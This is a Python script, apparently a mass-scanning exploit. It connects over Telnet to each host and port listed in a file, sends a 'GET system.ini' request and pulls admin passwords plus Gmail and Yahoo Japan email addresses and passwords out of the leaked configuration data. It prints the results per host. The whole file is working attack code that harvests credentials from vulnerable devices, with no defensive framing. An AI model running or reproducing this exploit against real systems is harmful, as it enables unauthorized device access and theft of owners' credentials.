from telnetlib import Telnet 
import socket

try:
	f = open('out.txt')
	lines = f.readlines()
except:
	print("out.txt file is missing...")

for line in lines:
	data = line.split()
	try:
		try:
			try:
				with Telnet(str(data[0]), int(data[1]), 1.5) as tn:
					print("---------------------\\http://" + data[0] + ":" + data[1] + "\\----------------------------")
					tn.write(b"GET system.ini\n\n")
					response = tn.read_all()
					idx = response.find(b'admin')
					if response.find(b'@gmail.com') != -1:
						mail_idx = response.find(b'@gmail.com')
						mail = response[mail_idx - 16 :]
						mail_idx = mail.find(b'@gmail.com')
						mail_pass = mail[mail_idx + 10:]
						mail = mail[:mail_idx + 10]
						flag = 0
						while flag == 0:
							if mail.find(b'\x01') != -1:
								tmp_idx = mail.find(b'\x01')
								mail = mail[tmp_idx + 1:]
							elif mail.find(b'/') != -1:
								tmp_idx = mail.find(b'/')
								mail = mail[tmp_idx + 1:]
							else:
								flag = 1
						mail = str(mail)
						mail_pass = str(mail_pass)
						print("mailaddr: " + mail.replace('b''', ''))
						print("mailpass: " + mail_pass.replace('b''', ''))

					if response.find(b'@yahoo.co.jp') != -1:
						mail_idx = response.find(b'@yahoo.co.jp')
						mail = response[mail_idx - 16 :]
						mail_idx = mail.find(b'@yahoo.co.jp')
						mail_pass = mail[mail_idx + 12:]
						mail = mail[:mail_idx + 12]
						flag = 0
						while flag == 0:
							if mail.find(b'\x01') != -1:
								tmp_idx = mail.find(b'\x01')
								mail = mail[tmp_idx + 1:]
							elif mail.find(b'/') != -1:
								tmp_idx = mail.find(b'/')
								mail = mail[tmp_idx + 1:]
							else:
								flag = 1
						mail = str(mail)
						mail_pass = str(mail_pass)
						print("mailaddr: " + mail.replace('b''', ''))
						print("mailpass: " + mail_pass.replace('b''', ''))

					if idx != -1:
						print("username: admin")
						print("password: ", end='')
						response = response[idx + 5:]
						idx = response.find(b'\x01')
						response = response[:idx]
						if response.find(b'\x05') != -1:
							idx = response.find(b'\x05')
							response = response[:idx]
						if response.find(b'\x03') != -1:
							idx = response.find(b'\x03')
							response = response[:idx]
						if response.find(b'\n') != -1:
							idx = response.find(b'\n')
							response = response[:idx]
						if response.find(b'\x1f') != -1:
							idx = response.find(b'\x1f')
							response = response[:idx]
						response = str(response[:idx])
						print(response.replace('b''', ''))
						print('\n')
					else:
						print("Not vulnerable")
					tn.close()
			except socket.timeout:
				print("timeout...\n")
		except EOFError:
			print("EOFError...\n")
	except:
		pass
